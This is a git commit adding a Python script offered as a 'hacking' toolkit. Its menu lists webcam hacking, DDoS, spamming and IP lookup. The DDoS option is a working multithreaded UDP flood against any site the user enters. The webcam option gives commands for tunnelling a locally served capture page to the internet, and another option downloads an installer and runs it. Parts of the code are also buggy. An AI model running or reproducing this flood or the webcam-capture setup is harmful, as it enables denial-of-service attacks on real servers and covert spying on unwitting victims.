043be5493bcbffb986791727e5def01f2273921c
elite-dragon <114304251+ELITE-DRAGON@users.noreply.github.com>
2023-10-31 22:48:48 +0330

    Add files via upload

---
+++ elite_dragon.py
@@ -0,0 +1,288 @@
+from time import sleep
+import sys 
+from colorama import init, Fore, Style 
+import requests
+import os
+from os import system
+import webbrowser
+import socket
+import _thread
+
+webbrowser.open_new_tab('https://www.youtube.com/@ELITE.DRAGON')
+
+print(Fore.RED + " passwords: elite ")
+
+def login(): 
+    init()  
+password = "" 
+count = 0 
+while password != "elite": 
+    password = input(Fore.GREEN + "Enter the password: >>> ") 
+    if password == "elite": 
+        print(Fore.RED + "Login successful! Welcome to the program.") 
+    else: 
+        count += 1 
+        if count == 3:
+            print(Fore.LIGHTGREEN_EX  + "Too many incorrect attempts. Please try again in 15 seconds.")
+            sleep(15)  
+            count = 0
+        else: 
+            print(Fore.GREEN + "Incorrect password. Please try again.") 
+system('clear')
+system('cls')
+sleep(3)
+print(Fore.GREEN + '''Hi, my frind,s my name is elite dragon
+
+Improper use of the tool is at the user's feet''') 
+print(Fore.RED+'''  
+     (    (                (     (                      )     )   
+     )\ ) )\ )  *   )      )\ )  )\ )   (     (      ( /(  ( /(   
+ (  (()/((()/(` )  /((    (()/( (()/(   )\    )\ )   )\()) )\())  
+ )\  /(_))/(_))( )(_))\    /(_)) /(_)|(((_)( (()/(  ((_)\ ((_)\   
+((_)(_)) (_)) (_(_()|(_)  (_))_ (_))  )\ _ )\ /(_))_  ((_) _((_)  
+| __| |  |_ _||_   _| __|  |   \| _ \ (_)_\(_|_)) __|/ _ \| \| |  
+| _|| |__ | |   | | | _|   | |) |   /  / _ \   | (_ | (_) | .` |  
+|___|____|___|  |_| |___|  |___/|_|_\ /_/ \_\   \___|\___/|_|\_|  
+Verjon : 1.2''') 
+
+
+while True:    
+    print(Fore.GREEN +''' 
+    1 = hack webcam 
+    2 = code install kali-nethunter  
+    3 = DDoS
+    4 = SPAMER
+    5 = your IP address
+    6 = ip web
+    7 = exit''') 
+    r4 = int(input(f'Enter Number >>>' + Fore.LIGHTMAGENTA_EX)) 
+    if r4 == 1: 
+        print(Fore.RED +'''hello my firend 
+        code install  not error 
+        kali >>> sudo apt-get install php && ssh 
+        termux >>> pkg install php && ssh 
+        go to the file elite_r for hack web cam and Code 
+        1 code >>>   php -S 127.0.0.1:3000 
+        new tab for next code 
+        2 code >>> ssh -R 80:127.0.0.1:3000 nokey@localhost.run''') 
+    if r4 == 2:
+            system('apt update && apt upgrade -y')   
+            system('termux-setup-storage')  
+            system('pkg install wget -y  ') 
+            system('wget -O install-nethunter-termux https://offs.ec/2MceZWr')
+            system('ls')
+            system('chmod +x install-nethunter-termux') 
+            system('./install-nethunter-termux')
+            system('user name AND enter')
+            system('password AND enter')
+    if r4 == 3:
+
+        class color:
+            green = "\033[32m"
+            red = "\033[31m"
+            blue = "\033[36m"
+            pink = "\033[35m"
+            yellow = "\033[93m"
+            darkblue = "\033[34m"
+            white = "\033[00m"
+            mark = '\x1b[38;5;4m'
+            mark1 = '\x1b[48;5;15m'
+            mark2 = '\x1b[0m'
+        #Theme
+        print(color.red+f"Loading",end='')
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        system('clear')
+        system('cls')
+        anonymous="""
+                                    .7KBQBBBBBBBBBIr
+                                i5RQQP1ri..   ..i7IbQQM2i
+                            rQBBDY.                   .JgBBMr
+                         rBQB7                             vBBBi
+                       PBBr                                   vBQI
+                     ZBD.                                       .QBX
+                   IBg                                             BBv
+                  BB.                                               .BB
+                vBY      qq.       ...:r::i.::i::i:..        :dI      XBi
+               DB     :BBR      ..: .:.  :  : ..  ::....       BBB.    .B2
+              BB   g:1BBi     .r:   .   ..  :  :.   .   :i.     7BQ7rd   Bb
+             gB   BE.BIi:   .:. ..:i.   i   i   :   .i:.. .:.   i:PB BB   BI
+            YB   BB :iIB   :.    ..  ..:: dd7BQ:.:..  ..    .:  .BJi. Qd   Bi
+            B  B BQ QBB   i     .:     :  BR XBB .     :.     i   BBD BB.B :B
+           BM PB BQBU:   :      i      i    :BM  i      i      i   iXBBB Bv BB
+          .B  BB Qu P7  i....  :.     ..    X    :      ..  ....i  u1 qg BB  B
+          BB  BB  rBB  i    ...i....  :.   .5    :. .....i...    :  BBi .BB  Bj
+          B  BB DBZ  .:     ..   .i...# maxtor #...: .    :       :   BBI.BZ iB
+         jQ Y: BQB..  :       :.      :           .      ..      .:   :BMB Y: B
+         BB MB RB  B  i       :       .   rEXEi   .       :       :  B  BS B1 B
+         BZ vB: : BP  i.......:        1B .QBd  Bv       .:.......:  BB r vB: B
+         BM  BB  BB   i . . . :  .:rUZBBB  rB:  BBBE1i:.  : ... . i   BB .BB  B
+         BB  KBgiBY   :        rBBBBBBQB.   Q   iBBBBBBBBi        :   KB:BBL  B
+         vB L YBBB Qi :        BBBBQBBBB:  5B7  7BBBBBBBBZ       .: LK BQQi r B
+          B rB  BR Bd  :       BQBQBQBBBQ  MQS  QBQBBBBBBB       :  BB BB  B.:B
+          QQ BB. : QB  :    . :BBBBBBBBBB7 bBs 5BBBBBBBBBB. .   ..  BB i :BB BY
+           B  BBB  BQ i :...  :BBBBBQBBBBB:KBJiBBBBBBBBBBB   ..:. r BB  BBQ  B
+           BB  uBBiBB Bj .    PBBQBBBBBQBBBBBQBBBBBBBQBQBBJ    . dB BRrBB7  BQ
+            B. 7 vBBQ rB: .   QBBBBBBBBBBBBBQBBBBBBBBBBBBBZ   . 7B..BBBr 7 7B
+            7B iB.  K5 BB     BQBBBBBQBQBBBBBBBQBBBBBBBBBBB     BB D1  iB. Q:
+             bQ .BBP:: YBd 5  BBQBBBBBBBQBQBBBQBBBBBQBBBBBB  X BBi ::gBB  BJ
+              gB  rBBBBrZB.uB7BBBBBBBBBQBBBBBQBBBQBBBBBBBQBrBi:QqrBBBQ:  BI
+               KB.  ivqBMBB 1BBBBBBBBBBBBBBBBBBBBBBBBBBBBBQB7 BBMBSvi  :BY
+                rQ5 .u7:. :r .KQBBBBBBBBBQBQBBBBBBBBBBBQBQS  7: .:vJ  DB:
+                  QB  iBBBBBBBBBQKrQQBBBBBBBBBBBBBBBQZrPQBBBBBBBBQ: .BB
+                   7Bg   :i:..    iQBBBBBBBQBQBBBBBBBRi    ..:r.   BBi
+                     XBR  .2ZQBBBBBBQBBBBBBBBBBBBBBBQBBBBBBQE1. .BBu
+                       uBQi  .r7i  BBQBBBBBQBBBBBBBBBQ .rri.  rBBv
+                         :gBgi     BQBBBBBBBQBBBBBBBBB     rMBZ.
+                            idBBgrJBBBBBBBBBBBBBBBBBBB77QBBP:
+                                .rv1XZMQQBBBBBBBQQgZSu7i
+
+        """
+        for i in anonymous:
+            sleep(0.001)
+            print(color.yellow+i,end='',flush=True)
+
+        site = input(Fore.RED +"Enter your web url :>>>  "+ Fore.YELLOW)
+        thread_count = input(Fore.LIGHTMAGENTA_EX +"Enter your thread :>>>" +Fore.RED)
+        ip = socket.gethostbyname(site)
+        UDP_PORT = 80
+        MESSAGE = 'server-script'
+        print("UDP target IP:", ip)
+        print("UDP target port:", UDP_PORT)
+        sleep(3)
+        def ddos(i):
+            while 1:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+                print("Packet Sent")
+        for i in range(int(thread_count)):
+            try:
+                _thread.start_new_thread(ddos, ("Thread-" + str(i),))
+            except KeyboardInterrupt:
+                sys.exit(0)
+        while 1:
+            pass     
+        system("clear")
+        sleep(2)
+
+    if r4 == 4:
+        system('clear')
+        system('cls')
+        
+        class color:
+            green = "\033[32m"
+            red = "\033[31m"
+            blue = "\033[34m"
+            pink = "\033[35m"
+            yellow = "\033[93m"
+            darkblue = "\033[34m"
+            white = "\033[00m"
+            mark = '\x1b[38;5;4m'
+            mark1 = '\x1b[48;5;15m'
+            mark2 = '\x1b[0m'
+        print(color.red+f"Loading",end='')
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        print(color.yellow+f".",end='',flush=True)
+        sleep(1)
+        m = input(color.pink+'Enter your spam >>> ')
+        sleep(3)
+        system("clear")
+        b="""
+
+                                .xUHWH!! !!?RYSONN:.
+                                .X*#M@$!!  !X!M$$$$$$WWx:.
+                            :!!!!!!?H! :!$!$$$$$$$$$$8X:
+                            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
+                            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
+                            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
+                            !:~~~ .:!M"T#$$$$WX??#MRMMDM!
+                                     ~?WuxiW*   "#$$$$8!!!!??!!!
+                            :X- M$$$$       "T#$T~!8$WUXU~
+                            :%  ~#$$$m:        ~!~ ?$$$$$$
+                        :!.-   ~T$$$$8xx.  .xWW- ~""##*"
+                .....   -~~:< !    ~?T#$$@@W@*?$$      /
+                W$@@M!!! .!~~ !!     .:XUW$W!~ "~:    :
+                #"~~.:x%!!  !H:   !WM$$$$Ti.: .!WUn+!
+                :::~:!!:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
+                .~~   :X@!.-~   ?@WTWo("*$$$W$TH$!
+                Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
+                $R@i.~~ !     :   ~$$$$$B$$en:`
+                ?MXT@Wx.~    :     ~"##*$$$$M~
+        [1].100
+        [2].1000
+        [3].10000
+        [4].100000
+        [5]. ?
+        """
+
+        for i in b:
+            sleep(0.00001)
+            print(color.red+i,end='',flush=True)
+        l=int(input("Enter your number >>> "))
+        print("\n"*10)
+        if l==2:
+            print(color.mark1+m * 100)
+        if l==2:
+            print(color.mark1+m * 1000)
+        if l==3:
+            print(color.mark1+m * 10000)
+        if l==4:
+            print(color.mark1+m * 100000)
+        if l ==5:
+            e = input(Fore.RED+'Enter Number >>>')
+            print(color.mark1+m * e)
+        print(color.mark2+":D")
+
+        exit = input(color.red+"Enter key For back >>> ")
+        print('ok')
+        sleep(2)
+        system("clear")
+        system('cls')
+        sleep(2)
+        
+
+        
+
+    elif r4 == 5:
+        host = socket.gethostname()
+        local = socket.gethostbyname(host)
+        http = requests.get('http://api.ipify.org').text
+        print(Fore.RED+'[*] '+ Fore.GREEN+'your_IP_local : '+Fore.YELLOW+ local)
+        print(Fore.RED+'[*] '+ Fore.GREEN+'your_IP_public : '+Fore.YELLOW + http)
+
+    elif r4 == 6:
+        def r23():
+
+            site = input(Fore.RED + 'Enter URL web >>> ' + Fore.GREEN)
+            ip = socket.gethostbyname(site)
+            print(Fore.RED +'[*]' + Fore.GREEN + f'IP WEB:{Fore.YELLOW+ ip}')
+        r23()
+    elif r4 == 7:
+        exit()
+    else:
+        pass
